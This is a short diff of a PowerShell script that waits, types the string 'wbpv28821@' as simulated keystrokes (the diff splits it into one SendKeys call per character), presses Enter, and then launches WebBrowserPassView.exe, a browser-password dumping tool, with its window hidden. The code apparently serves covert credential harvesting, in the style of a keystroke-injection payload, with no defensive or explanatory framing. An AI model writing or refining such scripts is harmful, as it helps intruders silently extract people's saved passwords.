@@ -22,7 +22,17 @@ Add-Type -AssemblyName System.Windows.Forms
 
 Start-Sleep -Seconds 5
 
-[System.Windows.Forms.SendKeys]::SendWait('wbpv28821@')
+[System.Windows.Forms.SendKeys]::SendWait('w')
+[System.Windows.Forms.SendKeys]::SendWait('b')
+[System.Windows.Forms.SendKeys]::SendWait('p')
+[System.Windows.Forms.SendKeys]::SendWait('v')
+[System.Windows.Forms.SendKeys]::SendWait('2')
+[System.Windows.Forms.SendKeys]::SendWait('8')
+[System.Windows.Forms.SendKeys]::SendWait('8')
+[System.Windows.Forms.SendKeys]::SendWait('2')
+[System.Windows.Forms.SendKeys]::SendWait('1')
+[System.Windows.Forms.SendKeys]::SendWait('@')
+
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
 Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
